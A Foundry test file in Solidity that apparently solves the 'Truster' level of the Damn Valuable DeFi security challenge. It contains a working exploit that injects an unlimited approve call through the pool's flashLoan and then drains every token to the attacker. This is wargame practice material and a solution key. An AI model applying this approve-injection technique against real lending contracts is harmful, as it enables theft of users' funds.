// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";
import {TrusterExploit} from "../../../src/Contracts/truster/TrusterExploit.sol";

contract Truster is Test {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    Utilities internal utils;
    TrusterLenderPool internal trusterLenderPool;
    DamnValuableToken internal dvt;
    address payable internal attacker;
    TrusterExploit trusterExploit;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        trusterExploit = new TrusterExploit();
        vm.label(address(trusterExploit), "Truster Exploit Contract");

        trusterLenderPool = new TrusterLenderPool(address(dvt));
        vm.label(address(trusterLenderPool), "Truster Lender Pool");

        dvt.transfer(address(trusterLenderPool), TOKENS_IN_POOL);

        assertEq(dvt.balanceOf(address(trusterLenderPool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        /**
         * EXPLOIT END *
         *     //
         */
        // TrusterExploit trusterExploit = new TrusterExploit();
        // trusterExploit.attack(address(trusterLenderPool), address(dvt));
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);

        trusterLenderPool.flashLoan(0, address(this), address(dvt), data);

        dvt.transferFrom(address(trusterLenderPool), attacker, dvt.balanceOf(address(trusterLenderPool)));

        validation();
        console.log("the balance of attacker is: %s", dvt.balanceOf(address(attacker)));
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
        assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
    }
}
